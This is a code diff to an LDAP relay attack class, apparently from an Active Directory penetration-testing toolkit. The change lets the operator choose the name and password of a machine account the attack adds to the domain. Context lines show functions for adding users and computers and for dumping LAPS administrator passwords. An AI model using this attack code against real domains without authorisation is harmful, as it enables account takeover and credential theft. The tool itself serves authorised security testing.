@@ -109,7 +109,8 @@ class LDAPAttack(ProtocolAttack):
     GENERIC_ALL             = 0x000F01FF
 
     def __init__(self, config, LDAPClient, username):
-        self.computerName = '' if config.addcomputer == 'Rand' else config.addcomputer
+        self.computerName = '' if not config.addcomputer else config.addcomputer[0]
+        self.computerPassword = '' if not config.addcomputer or len(config.addcomputer) < 2 else config.addcomputer[1]
         ProtocolAttack.__init__(self, config, LDAPClient, username)
         if self.config.interactive:
             # Launch locally listening interactive shell.
@@ -125,9 +126,6 @@ class LDAPAttack(ProtocolAttack):
             LOG.error('New computer already added. Refusing to add another')
             return
 
-        # Random password
-        newPassword = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))
-
         # Get the domain we are in
         domaindn = domainDumper.root
         domain = re.sub(',DC=', '.', domaindn[domaindn.find('DC='):], flags=re.I)[3:]
@@ -138,6 +136,13 @@ class LDAPAttack(ProtocolAttack):
             newComputer = (''.join(random.choice(string.ascii_letters) for _ in range(8)) + '$').upper()
         else:
             newComputer = computerName if computerName.endswith('$') else computerName + '$'
+
+        computerPassword = self.computerPassword
+        if not computerPassword:
+            # Random password
+            newPassword = ''.join(random.choice(string.ascii_letters + string.digits + '.,;:!$-_+/*(){}#@<>^') for _ in range(15))
+        else:
+            newPassword = computerPassword
 
         computerHostname = newComputer[:-1]
         newComputerDn = ('CN=%s,%s' % (computerHostname, parent)).encode('utf-8')
@@ -183,7 +188,7 @@ class LDAPAttack(ProtocolAttack):
             return
 
         # Random password
-        newPassword = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))
+        newPassword = ''.join(random.choice(string.ascii_letters + string.digits + '.,;:!$-_+/*(){}#@<>^') for _ in range(15))
 
         # Random username
         newUser = ''.join(random.choice(string.ascii_letters) for _ in range(10))
@@ -635,7 +640,7 @@ class LDAPAttack(ProtocolAttack):
             LOG.info("Attempting to dump LAPS passwords")
 
             success = self.client.search(domainDumper.root, '(&(objectCategory=computer))', search_scope=ldap3.SUBTREE, attributes=['DistinguishedName','ms-MCS-AdmPwd'])
-            
+
             if success:
 
                 fd = None
